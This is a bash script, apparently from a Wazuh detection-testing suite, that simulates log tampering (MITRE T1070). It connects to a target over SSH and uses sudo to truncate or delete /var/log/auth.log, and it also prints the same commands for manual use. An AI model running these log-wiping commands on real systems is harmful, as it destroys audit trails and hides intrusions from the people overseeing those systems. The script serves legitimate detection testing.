#!/bin/bash
#===============================================================================
# Attack #17: Log Tampering / Deletion
# Category: Log Tampering
# Expected Wazuh Rules: 592 (lvl8), 554 (lvl5)
# Expected Level: 5-8 (observed)
# MITRE ATT&CK: T1070.001 (Clear Windows Event Logs) / T1070.004 (Delete Logs)
#===============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../scripts/config.env" 2>/dev/null || true

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

ATTACK_ID="17"
ATTACK_NAME="Log Tampering"
ATTACK_CATEGORY="Log Tampering"

TARGET="${1:-$TARGET_IP}"
LOG_FILE="${2:-/var/log/auth.log}"
MODE="${3:-truncate}" # truncate | delete | both
SSH_USER="${TARGET_USER:-ubuntu}"
SSH_KEY_RAW="${SSH_KEY_OVERRIDE:-${TARGET_SSH_KEY:-$HOME/.ssh/wazuh-agent.pem}}"
SSH_KEY="${SSH_KEY_RAW/#\~/$HOME}"

echo "==============================================================================="
echo -e "${YELLOW}ATTACK #${ATTACK_ID}: ${ATTACK_NAME}${NC}"
echo "==============================================================================="
echo "Target: $TARGET"
echo "Log File: $LOG_FILE"
echo "Mode: $MODE"
echo "Category: $ATTACK_CATEGORY"
echo ""

START_TIME=$(date +%s.%N)
START_TIMESTAMP=$(date -Iseconds)

echo -e "${GREEN}[*] Attack started at: $START_TIMESTAMP${NC}"
echo "[*] Attempting to truncate and delete log file..."
echo ""


if [ -n "$SSH_KEY" ] && [ -f "$SSH_KEY" ]; then
    echo "[*] Running attack via SSH to $SSH_USER@$TARGET"
    ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no "$SSH_USER@$TARGET" \
        LOG_FILE="$LOG_FILE" MODE="$MODE" 'bash -s' <<'EOF'
if [ -z "$LOG_FILE" ]; then
    echo "[!] LOG_FILE is empty; aborting"; exit 1; fi
BACKUP="${LOG_FILE}.bak.$(date +%s)"
if [ -f "$LOG_FILE" ]; then
    echo "[*] Backing up $LOG_FILE to $BACKUP"
    sudo cp "$LOG_FILE" "$BACKUP" 2>/dev/null || true
    if [ "$MODE" = "truncate" ] || [ "$MODE" = "both" ]; then
        echo "[*] Truncating $LOG_FILE"
        : | sudo tee "$LOG_FILE" >/dev/null
    fi
    if [ "$MODE" = "delete" ] || [ "$MODE" = "both" ]; then
        echo "[*] Deleting $LOG_FILE"
        sudo rm -f "$LOG_FILE"
    fi
else
    echo "[!] $LOG_FILE not found; creating a sample then deleting"
    echo "Test log entry" | sudo tee "$LOG_FILE" >/dev/null
    sudo rm -f "$LOG_FILE"
fi
EOF
else
    echo -e "${YELLOW}[!] Cannot connect to target (no SSH key). Printing commands to run manually:${NC}"
    cat <<'EOF'
#!/bin/bash
LOG_FILE="/var/log/auth.log" # adjust
MODE="truncate" # truncate|delete|both
if [ -z "$LOG_FILE" ]; then echo "LOG_FILE empty"; exit 1; fi
BACKUP="${LOG_FILE}.bak.$(date +%s)"
if [ -f "$LOG_FILE" ]; then
  sudo cp "$LOG_FILE" "$BACKUP" 2>/dev/null || true
  if [ "$MODE" = "truncate" ] || [ "$MODE" = "both" ]; then : | sudo tee "$LOG_FILE" >/dev/null; fi
  if [ "$MODE" = "delete" ] || [ "$MODE" = "both" ]; then sudo rm -f "$LOG_FILE"; fi
else
  echo "Test log entry" | sudo tee "$LOG_FILE" >/dev/null
  sudo rm -f "$LOG_FILE"
fi
EOF
fi

END_TIME=$(date +%s.%N)
END_TIMESTAMP=$(date -Iseconds)
DURATION=$(echo "$END_TIME - $START_TIME" | bc)

echo ""
echo "==============================================================================="
echo -e "${GREEN}[✓] Attack completed${NC}"
echo "==============================================================================="
echo "End Time: $END_TIMESTAMP"
echo "Duration: ${DURATION} seconds"
echo ""
echo "Expected Wazuh alerts:"
echo "  - Log deletion or truncation events"
echo "  - FIM alerts for critical log files"
echo ""
echo "Data for CSV:"
echo "  attack_id: $ATTACK_ID"
echo "  attack_name: $ATTACK_NAME"
echo "  category: $ATTACK_CATEGORY"
echo "  attack_start_time: $START_TIMESTAMP"
echo "  attack_end_time: $END_TIMESTAMP"
